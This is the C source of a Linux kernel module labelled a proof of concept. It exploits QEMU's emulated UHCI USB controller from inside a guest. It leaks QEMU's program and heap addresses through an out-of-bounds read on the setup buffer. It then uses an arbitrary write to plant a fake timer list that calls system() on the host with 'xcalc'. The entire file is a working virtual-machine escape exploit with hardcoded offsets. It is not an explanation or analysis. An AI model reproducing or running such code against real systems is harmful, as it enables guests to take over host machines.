#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/string.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("f00l");
MODULE_DESCRIPTION("This is my poc module");

#define PORTSC_PRESET       (1 << 8)     // Port Reset
#define PORTSC_PED          (1 << 2)     // Port Enable/Disable
#define USBCMD_RUNSTOP      (1 << 0)
#define USBCMD_PSE          (1 << 4)
#define USB_DIR_OUT			0
#define USB_DIR_IN			0x80
#define QTD_TOKEN_ACTIVE    (1 << 7)
#define USB_TOKEN_SETUP     0x2d
#define USB_TOKEN_IN        0x69 /* device -> host */
#define USB_TOKEN_OUT       0xe1 /* host -> device */
#define QTD_TOKEN_TBYTES_SH 16
#define QTD_TOKEN_PID_SH    8

typedef struct USBEndpoint USBEndpoint;
typedef struct USBDevice USBDevice;

typedef struct UHCI_TD {
    uint32_t link;
    uint32_t ctrl; /* see TD_CTRL_xxx */
    uint32_t token;
    uint32_t buffer;
} UHCI_TD;

uint32_t port_base = 0xc0c0;
void *dmabuf = NULL;
void *frame_base = NULL;
UHCI_TD *td = NULL;
char *data_buf = NULL;
uint32_t phy_td = 0;
uint64_t base = 0;
uint64_t system = 0;
uint64_t heap_base = 0;
uint64_t uhci_state = 0;
uint64_t main_loop_tlg = 0;
uint64_t data_buf_addr = 0;

uint16_t pmio_read(uint32_t addr) {
    return (uint16_t)inw(addr + port_base);
}

void pmio_write(uint32_t addr, uint16_t val) {
    outw(val, addr + port_base);
}

void die(char *msg) {
    printk(msg);
}

void init(void) {
    dmabuf = kmalloc(0x3000, GFP_DMA | GFP_ATOMIC);
    if(dmabuf == NULL) {
        die("malloc dmabuf failed\n");
    }

    printk(KERN_ALERT"dmi buffer addr: %p\n", (void *)virt_to_phys(dmabuf));
    td = dmabuf + 0x100;
    frame_base = dmabuf + 0x1000;
    data_buf = dmabuf + 0x2000;
}

//the max of iov_size is 0x7fe
void set_td(uint16_t iov_size, uint8_t option) {
    int i;
    td->link = 0;
    td->ctrl = 1 << 23;
    td->token = (iov_size << 21) | option;
    td->buffer = virt_to_phys(data_buf);
    phy_td = virt_to_phys(td);
    for(i = 0; i < 1024; i++) {
        *(uint32_t *)((uint32_t *)frame_base + i) = phy_td;
    }
}

void set_frame_base(void) {
    printk(KERN_INFO"frame_addr %p\n", (void *)virt_to_phys(frame_base));
    printk(KERN_INFO"write 0x8 port: %lld\n", virt_to_phys(frame_base) & 0xf000);
    pmio_write(0x8, virt_to_phys(frame_base) & 0xf000);
    printk(KERN_INFO"write 0xa port: %lld\n", (virt_to_phys(frame_base) & 0xffff0000) >> 16);
    pmio_write(0xa, (virt_to_phys(frame_base) & 0xffff0000) >> 16);
}

void reset_uhci(void) {
    pmio_write(0, 3);
}

void enable_port(void) {
    pmio_write(0x10, 0x4);
    pmio_write(0x12, 0x4);
}

void set_length(uint16_t length, uint8_t option) {
    data_buf[0] = option;
    data_buf[7] = length >> 8;
    data_buf[6] = length & 0xff;
    *(uint64_t *)(data_buf + 8) = 0x636c616378; //xcalc
}

void do_setup(void) {
    set_td(0x7, USB_TOKEN_SETUP);
    set_length(0xf0, USB_DIR_IN);
    reset_uhci();
    enable_port();
    set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

void do_set_lenth(uint8_t option) {
    set_td(0x7, USB_TOKEN_SETUP);
    set_length(0xdead, option);
    reset_uhci();
    enable_port();
    set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

void do_read(uint16_t len) {
    set_td(len, USB_TOKEN_IN);
    set_length(0xdead, USB_DIR_IN);
    reset_uhci();
    enable_port();
    set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

void set_fake(void) {
    char *buf = data_buf;
    uint64_t fake_timer_list = data_buf_addr + 0xc00;
    *(uint64_t *)buf = base +  0x129e0f0; // qemu_clocks
    memset(buf + 8, 0, 8 * 6);
    *(uint64_t *)(buf + 0x38) = 0x0000000100000000;
    *(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers
    *(uint64_t *)(buf + 0x48) = 0;
    *(uint64_t *)(buf + 0x50) = 0;
    *(uint64_t *)(buf + 0x58) = base + 0x3135ad; // qemu_timer_notify_cb
    *(uint64_t *)(buf + 0x60) = 0;
    *(uint64_t *)(buf + 0x68) = 0x0000000100000000;
    *(uint64_t *)(buf + 0x70) = 0; // expire_time set to 0 will trigger func cb
    *(uint64_t *)(buf + 0x78) = fake_timer_list;
    *(uint64_t *)(buf + 0x80) = system;    // system plt
    *(uint64_t *)(buf + 0x88) = data_buf_addr + 8; // parameter address
    *(uint64_t *)(buf + 0x90) = 0;
    *(uint64_t *)(buf + 0x98) = 0x000f424000000000;
}

#define NORMAL 1
#define FAKE 2
void do_write(uint16_t len, uint8_t which) {
    set_td(len, USB_TOKEN_OUT);
    if(which == NORMAL)
        set_length(0xdead, USB_DIR_OUT);
    else if(which == FAKE)
	set_fake();
    reset_uhci();
    enable_port();
    set_frame_base();
    pmio_write(0, 1);
    mdelay(100);
}

void arb_write(uint64_t target,uint64_t data) {
    int i;
    uint32_t offset = target - data_buf_addr;
    do_setup();
    do_set_lenth(USB_DIR_OUT);
    for(i = 0; i < 3; i++)
        do_write(0x3ff, 1);
    do_write(0x3ff, 2);
    *(uint32_t *)(data_buf + 0) = 0x0; //overwrite the remote_wake
    *(uint32_t *)(data_buf + 4) = (uint32_t)2; //overwrite the setup_state
    *(uint32_t *)(data_buf + 8) = (uint32_t)0xdead; //overwrite the setup_len
    printk(KERN_INFO"[+]the offset is %llx", offset);
    *(uint32_t *)(data_buf + 12) = offset - 0x10;
    do_write(0xf, 0);
    *(uint64_t *)data_buf = data;
    do_write(0x7, 0);
}

void exp(void) {
    int i;
    init(); //alloc a big dma memory
    do_setup(); //init the s->setup_len to 0xf0, in order to set the s->state = SETUP_DATA
    do_set_lenth(USB_DIR_IN); //init the s->setup_len to 0x7fe to oob read
    for(i = 0; i < 4; i++)
        do_read(0x7fe); //oob read
    base = *(uint64_t *)(data_buf + 7) - 0x73D513;
    heap_base = *(uint64_t *)(data_buf + 15) - 0xEB4240;
    system = base + 0x2ba600;
    uhci_state = heap_base + 0xDA48E0;
    data_buf_addr = heap_base + 0xEB43EC; 
    main_loop_tlg = base + 0x129e0c0;
    printk(KERN_INFO"[+]the program base is: 0x%llx", base);
    printk(KERN_INFO"[+]the heap    base is: 0x%llx", heap_base);
    printk(KERN_INFO"[+]the uhci   state is: 0x%llx", uhci_state);
    printk(KERN_INFO"[+]the system  base is: 0x%llx", system);
    printk(KERN_INFO"[+]the buffer  addr is: 0x%llx", data_buf_addr);
//--------------------------------------------------------------------//
    arb_write(main_loop_tlg, data_buf_addr + 0xc00);
    pmio_write(0, 2);
}

static int __init uhci_init(void) {
    exp();
    return 1;
}

static void __exit uhci_exit(void) {
    exp();
}

module_init(uhci_init);
module_exit(uhci_exit);
